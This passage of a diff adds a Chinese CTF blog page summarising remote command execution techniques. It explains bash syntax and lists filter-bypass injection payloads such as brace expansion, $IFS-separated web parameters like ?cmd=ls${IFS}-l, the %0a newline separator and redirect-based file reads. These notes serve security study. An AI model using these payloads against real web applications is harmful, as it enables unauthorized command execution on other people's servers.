@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="8(・ω&lt; )★RCE总结 Re:Master | 雲流のLowest World https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;RCE-labs?tab&#x3D;readme-ov-file 奇安信攻防社区-RCE全覆盖总结 命令执行 - 基于终端特性的绕过Bash特殊语法、特殊变量与特殊展开完全指南 | techist.info  “后来者胜出原则”（也称“后出现的选项覆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE总结">
+<meta property="og:url" content="http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="8(・ω&lt; )★RCE总结 Re:Master | 雲流のLowest World https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;RCE-labs?tab&#x3D;readme-ov-file 奇安信攻防社区-RCE全覆盖总结 命令执行 - 基于终端特性的绕过Bash特殊语法、特殊变量与特殊展开完全指南 | techist.info  “后来者胜出原则”（也称“后出现的选项覆">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123154149409.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123181014517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260126185219997.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260126185309052.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123183254990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123195241870.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128152930807.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128153551023.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260108174357897.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260107171048892.png">
+<meta property="article:published_time" content="2026-01-28T11:20:44.000Z">
+<meta property="article:modified_time" content="2026-01-28T11:21:19.264Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="总结篇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123154149409.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>RCE总结</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/28/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Frce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&text=RCE总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&is_video=false&description=RCE总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE总结&body=Check out this article: http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&name=RCE总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&t=RCE总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8E%E7%BB%88%E7%AB%AF%E7%89%B9%E6%80%A7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">命令执行 - 基于终端特性的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.</span> <span class="toc-text">shell输入输出重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">文件描述符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.2.</span> <span class="toc-text">linux 逻辑运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.</span> <span class="toc-text">linux 命令替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E7%AE%97%E6%9C%AF%E6%8B%93%E5%B1%95"><span class="toc-number">1.4.</span> <span class="toc-text">linux 算术拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E5%8F%82%E6%95%B0%E6%89%A9%E5%B1%95"><span class="toc-number">1.5.</span> <span class="toc-text">linux 参数扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.6.</span> <span class="toc-text">过滤空格</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.6.1.</span> <span class="toc-text">大括号{}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AD%97%E6%AE%B5%E5%88%86%E9%9A%94%E7%AC%A6IFS"><span class="toc-number">1.6.2.</span> <span class="toc-text">内部字段分隔符IFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-number">1.6.3.</span> <span class="toc-text">重定向符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%97%B4%E9%9A%94%E7%AC%A6"><span class="toc-number">1.6.4.</span> <span class="toc-text">其他间隔符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%90%8D-%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.</span> <span class="toc-text">命令名&amp;文件名过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.7.1.</span> <span class="toc-text">通配符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">注意点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">1.7.2.</span> <span class="toc-text">特殊变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">1.7.3.</span> <span class="toc-text">单引号 双引号 反引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-number">1.7.4.</span> <span class="toc-text">反斜线\</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.7.5.</span> <span class="toc-text">拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.7.6.</span> <span class="toc-text">利用linux中的环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-linux%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.7.7.</span> <span class="toc-text">管道符&amp;linux命令替换</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#printf"><span class="toc-number">1.7.7.1.</span> <span class="toc-text">printf</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E5%91%BD%E4%BB%A4%E6%90%AD%E9%85%8D%E9%80%9A%E9%85%8D%E7%AC%A6RCE"><span class="toc-number">1.7.8.</span> <span class="toc-text">绝对命令搭配通配符RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.8.</span> <span class="toc-text">查看目录的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%90%84%E7%A7%8D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.9.</span> <span class="toc-text">Linux各种读取文件的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.10.</span> <span class="toc-text">无回显RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">1.11.</span> <span class="toc-text">bash无字母数字rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6rce"><span class="toc-number">1.12.</span> <span class="toc-text">bash长度限制rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-bypass%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.</span> <span class="toc-text">php-bypass空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">php不需要括号的敏感函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">php函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.</span> <span class="toc-text">php无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE"><span class="toc-number">6.</span> <span class="toc-text">php无字母数字RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">6.0.1.</span> <span class="toc-text">临时文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0RCE"><span class="toc-number">7.</span> <span class="toc-text">php数学函数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FRCE"><span class="toc-number">8.</span> <span class="toc-text">环境变量RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E5%9C%A8%E9%87%8E%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">通配符在野注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cp%E6%8C%87%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">9.0.1.</span> <span class="toc-text">cp指令参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9A%84%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99%EF%BC%88Shell-Globbing%EF%BC%89"><span class="toc-number">9.0.2.</span> <span class="toc-text">* 的解析规则（Shell Globbing）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%8A%AB%E6%8C%81"><span class="toc-number">10.</span> <span class="toc-text">LD_PRELOAD劫持</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RCE总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T11:20:44.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%80%BB%E7%BB%93%E7%AF%87/" rel="tag">总结篇</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">8(・ω&lt; )★RCE总结 Re:Master | 雲流のLowest World</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/RCE-labs?tab=readme-ov-file">https://github.com/ProbiusOfficial/RCE-labs?tab=readme-ov-file</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1048">奇安信攻防社区-RCE全覆盖总结</a></p>
+<h2 id="命令执行-基于终端特性的绕过"><a href="#命令执行-基于终端特性的绕过" class="headerlink" title="命令执行 - 基于终端特性的绕过"></a>命令执行 - 基于终端特性的绕过</h2><p><a target="_blank" rel="noopener" href="https://techist.info/zh/bash-special-variables-complete/">Bash特殊语法、特殊变量与特殊展开完全指南 | techist.info</a></p>
+<blockquote>
+<p>“<strong>后来者胜出原则</strong>”（也称“<strong>后出现的选项覆盖先出现的选项</strong>”）是 Linux&#x2F;Unix 命令行工具中一个<strong>广泛存在但常被忽视的行为规则</strong>。它指的是：</p>
+<blockquote>
+<p><strong>当同一个命令行参数（尤其是带值的选项）多次出现时，通常以最后一次出现的值为准。</strong></p>
+</blockquote>
+</blockquote>
+<h3 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h3><blockquote>
+<p>几乎所有的命令都会涉及从屏幕输出和从键盘获取输入的问题，而在Linux系统中可以将输出发送到指定的文件，或从文件中读取输入。每个shell命令都有它自己的输入文件和输出文件。在一个命令执行之前，该命令的输入和输出可以使用由shell解释的特殊标记进行重定向。例如。将date命令的输出发送到文件而不是屏幕上。改变输入或输出的默认路径的操作就叫作重定向。</p>
+</blockquote>
+<h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><blockquote>
+<p>一般情况下，每个 Unix&#x2F;Linux 命令运行时都会打开三个文件：</p>
+<ul>
+<li>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</li>
+<li>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</li>
+<li>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</li>
+</ul>
+</blockquote>
+<h3 id="linux-逻辑运算符"><a href="#linux-逻辑运算符" class="headerlink" title="linux 逻辑运算符"></a>linux 逻辑运算符</h3><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>说明</th>
+<th>示例代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&amp;&amp;</code>（逻辑与运算符）</td>
+<td>AND操作 只有当第一个命令 <code>cmd_1</code> 执行成功（返回值为 0）时，才会执行第二个命令 <code>cmd_2</code>。</td>
+<td><code>mkdir new_folder &amp;&amp; cd new_folder</code> （只有在新建文件夹成功后才进入该文件夹）</td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td></td>
+<td>&#96;（逻辑或运算符）</td>
+</tr>
+<tr>
+<td><code>&amp;</code>（后台运行符）</td>
+<td>将命令 <code>cmd_1</code> 放到后台执行，Shell 立即执行 <code>cmd_2</code>，两个命令并行执行。</td>
+<td><code>sleep 10 &amp; echo &quot;This will run immediately.&quot;</code></td>
+</tr>
+<tr>
+<td><code>;</code>（命令分隔符）</td>
+<td>无论前一个命令 <code>cmd_1</code> 是否成功，都会执行下一个命令 <code>cmd_2</code>。这允许将命令堆叠在一起。命令会依次执行。</td>
+<td><code>echo &quot;Hello&quot;; echo &quot;World&quot;</code> （先输出 “Hello”，再输出 “World”）</td>
+</tr>
+</tbody></table>
+<p>命令手册：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">https://www.runoob.com/linux/linux-command-manual.html</a></p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%0a #换行符也能实现换行</span><br><span class="line">%00</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="linux-命令替换"><a href="#linux-命令替换" class="headerlink" title="linux 命令替换"></a>linux 命令替换</h3><blockquote>
+<p>在 Linux 中，命令替换是指将命令的输出结果赋值给某个变量。这在 Shell 编程中非常常见和有用。命令替换有两种主要方式：反引号（&#96;&#96;）和 $()。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123154149409.png" alt="image-20260123154149324"></p>
+<h3 id="linux-算术拓展"><a href="#linux-算术拓展" class="headerlink" title="linux 算术拓展"></a>linux 算术拓展</h3><blockquote>
+<p>Bash中算术展开的语法是<code>$(())</code>。在双括号内，您可以放入数学公式、变量和运算符。</p>
+<p> <code>$[]</code> —— 已废弃的旧式算术扩展</p>
+<p><a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Arithmetic-Expansion.html">算术展开（Bash参考手册）</a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2020/08/17/Arithmetic-Expansion-to-RCE/">从算数扩展到 RCE - Tr0y’s Blog</a></p>
+<h3 id="linux-参数扩展"><a href="#linux-参数扩展" class="headerlink" title="linux 参数扩展"></a>linux 参数扩展</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">Shell Parameter Expansion (Bash Reference Manual)</a></p>
+<p>${ } 操作<strong>变量</strong>：取值、截取、设默认值等</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;Alice&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 明确变量边界（避免歧义）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello<span class="variable">$&#123;name&#125;</span>!&quot;</span>        <span class="comment"># 输出: HelloAlice!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 默认值：若变量未设置，用默认值</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;user:-guest&#125;</span>         <span class="comment"># 若 $user 未定义，输出 guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 截取子串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name:0:3&#125;</span>            <span class="comment"># 输出: Ali</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 删除匹配部分</span></span><br><span class="line">file=<span class="string">&quot;/home/user/doc.txt&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;file##*/&#125;</span>            <span class="comment"># 输出: doc.txt（删最长前缀匹配 */）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;file%.*&#125;</span>             <span class="comment"># 输出: /home/user/doc（删最短后缀匹配 .*）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 获取变量长度</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#name&#125;</span>               <span class="comment"># 输出: 5</span></span><br></pre></td></tr></table></figure></blockquote>
+<ul>
+<li>可以搭配<code>PATH</code>等环境变量绕过</li>
+</ul>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><h4 id="大括号"><a href="#大括号" class="headerlink" title="大括号{}"></a>大括号{}</h4><blockquote>
+<p>通配符</p>
+<p><a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html">Brace Expansion (Bash Reference Manual)</a></p>
+<p>使用条件： <strong>shell 必须支持 brace expansion（如 Bash）</strong></p>
+<p><strong>dash 不支持大括号扩展</strong>！</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">ls</span>,&#125;</span><br><span class="line">&#123;<span class="built_in">cat</span>,f*&#125;</span><br><span class="line"><span class="comment">#在php的system函数中 在大多数系统（尤其是 Debian/Ubuntu 等 Linux 发行版）中，/bin/sh 默认指向 dash（而不是 bash）。看系统</span></span><br><span class="line">bash -c &#123;<span class="built_in">cat</span>,f*&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123181014517.png" alt="image-20260123181014442"></p>
+<p>kail效果图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260126185219997.png" alt="image-20260126185219876"></p>
+<p>centos效果图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260126185309052.png" alt="image-20260126185308945"></p>
+<h4 id="内部字段分隔符IFS"><a href="#内部字段分隔符IFS" class="headerlink" title="内部字段分隔符IFS"></a>内部字段分隔符<code>IFS</code></h4><blockquote>
+<p>在Linux中，IFS的默认值是设定为包含空格、制表符和换行符的字符串：” \t\n”。它在shell解析字符串时，将这些字符作为字段分隔符进行划分。</p>
+<p><a target="_blank" rel="noopener" href="https://geek-docs.com/linux/linux-ask-answer/65_tk_1706927461.html">Linux IFS|极客教程</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$9</span>#<span class="variable">$n</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$9</span>#<span class="variable">$n</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$@</span>#特殊字符</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。<br>?cmd&#x3D;ls$IFS-I<br>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名<br>?cmd&#x3D;ls${IFS}-l<br>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。<br>?cmd&#x3D;ls${IFS}$9-l</p>
+</blockquote>
+<h4 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符"></a>重定向符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;f*</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;f*</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>&lt;&gt; —— 该方法无法通过system函数实现。但在终端可以复现。</li>
+<li>使用<code>&lt;</code>时 环境问题可能导致通配符不展开,这时可以用单引号、双引号、反引号、特殊变量等构造文件名</li>
+</ul>
